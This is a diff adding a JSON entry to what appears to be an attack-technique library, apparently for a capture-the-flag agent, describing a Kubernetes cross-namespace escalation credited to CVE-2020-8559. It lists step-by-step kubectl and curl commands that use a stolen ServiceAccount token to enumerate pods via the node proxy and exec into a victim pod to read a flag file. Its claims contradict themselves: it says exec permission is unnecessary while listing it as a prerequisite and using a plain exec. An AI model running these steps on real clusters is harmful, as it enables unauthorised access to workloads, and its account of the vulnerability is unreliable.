@@ -1,0 +1,47 @@
+[
+  {
+    "id": "k8s-node-api-redirect",
+    "category": "EXPLOIT",
+    "subcategory": "K8s_Networking",
+    "title": "K8s Compromised Node API Redirect (CVE-2020-8559) — Node-to-Master Privilege Escalation via Proxy",
+    "description": "CVE-2020-8559 (CVSS 6.4) affects Kubernetes kubelet versions prior to v1.20.x. The vulnerability lies in the node proxy subresource — an authenticated user with node proxy access can redirect the kube-apiserver's exec/attach/portforward requests to any pod in the cluster, bypassing namespace isolation. Attack: (1) Obtain a ServiceAccount token with node proxy permissions (typically a node-operator or cluster-admin SA token). Verify permissions: kubectl auth can-i get nodes and kubectl auth can-i create pods/exec. (2) Discover the target node name: NODE_NAME=$(kubectl get node -o jsonpath='{.items[0].metadata.name}'). (3) List pods on the node via node proxy: curl -k -H \"Authorization: Bearer $TOKEN\" \"https://kubernetes.default.svc/api/v1/nodes/${NODE_NAME}/proxy/pods\". (4) Identify the victim pod in the target namespace. (5) Use the node proxy to exec into the victim pod (CVE-2020-8559 redirect): kubectl --token=$TOKEN exec -n secure-ns victim-pod -- cat /flag.txt. Key insights: (a) The vulnerability is that node proxy does not validate the target pod's namespace — an attacker with node proxy access can exec into pods in any namespace. (b) The attacker does not need direct pod exec permissions in the target namespace — node proxy access is sufficient. (c) This is a node-to-master escalation: compromising any node or obtaining a node-operator SA token leads to cross-namespace code execution.",
+    "techniques": [
+      "kubectl auth can-i get nodes",
+      "kubectl auth can-i create pods/exec",
+      "kubectl get node -o jsonpath='{.items[0].metadata.name}'",
+      "curl -k -H \"Authorization: Bearer TOKEN\" https://kubernetes.default.svc/api/v1/nodes/NODE/proxy/pods",
+      "kubectl --token=TOKEN exec -n NAMESPACE POD -- cat /flag.txt",
+      "kubectl --token=TOKEN --server=https://kubernetes.default.svc exec -n secure-ns victim-pod -- cat /flag.txt"
+    ],
+    "indicators": [
+      "kubernetes version < 1.20 (vulnerable to CVE-2020-8559)",
+      "ServiceAccount with node proxy permissions (get nodes, create pods/exec)",
+      "Node-operator or cluster-admin SA token accessible",
+      "Victim pod in isolated namespace reachable via node proxy"
+    ],
+    "prerequisites": [
+      "ServiceAccount token with get nodes and create pods/exec permissions",
+      "Network access to kube-apiserver",
+      "kubectl or curl for API requests",
+      "Kubernetes version vulnerable to CVE-2020-8559"
+    ],
+    "tools": [
+      "kubectl_auth_check",
+      "kubectl_get_pods",
+      "kubectl_exec",
+      "curl_get"
+    ],
+    "tags": [
+      "k8s",
+      "cve-2020-8559",
+      "node-redirect",
+      "api-server",
+      "proxy",
+      "privilege-escalation",
+      "k8s-26",
+      "cross-namespace"
+    ],
+    "confidence": 0.75,
+    "mitre_attack": "T1190"
+  }
+]
